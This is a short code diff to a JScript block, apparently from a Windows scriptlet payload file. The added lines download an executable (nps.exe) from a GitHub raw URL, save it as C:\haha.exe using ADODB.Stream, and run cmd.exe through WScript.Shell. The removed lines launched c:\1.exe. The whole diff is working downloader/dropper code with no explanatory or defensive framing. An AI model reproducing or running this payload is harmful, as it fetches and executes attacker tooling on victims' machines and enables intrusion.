@@ -12,10 +12,33 @@
 
 <script language="JScript">
 <![CDATA[
+  var objArgs=WScript.Arguments; 
+  var sGet=new ActiveXObject("ADODB.Stream"); 
+  var xGet=null; 
+  try{ 
+  xGet=new XMLHttpRequest(); 
+  }catch(e){ 
+  try{ 
+  xGet=new ActiveXObject("Msxml2.XMLHTTP"); 
+  }catch(ex){ 
+  try{ 
+  xGet=new ActiveXObject("Microsoft.XMLHTTP"); 
+  }catch(e3){ 
+  xGet=null; 
+  } 
+  } 
+  } 
+  if(xGet != null){ 
+  xGet.Open("GET","https://raw.githubusercontent.com/kxcode/download/master/nps.exe",0); 
+  xGet.Send(); 
+  sGet.Mode=3; 
+  sGet.Type=1; 
+  sGet.Open(); 
+  sGet.Write(xGet.ResponseBody); 
+  sGet.SaveToFile("C:\\haha.exe",2); 
+  }
 
-	var r = new ActiveXObject("WScript.Shell").Run("c:\\1.exe");
-	
-	
+  var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
 ]]>
 </script>
 
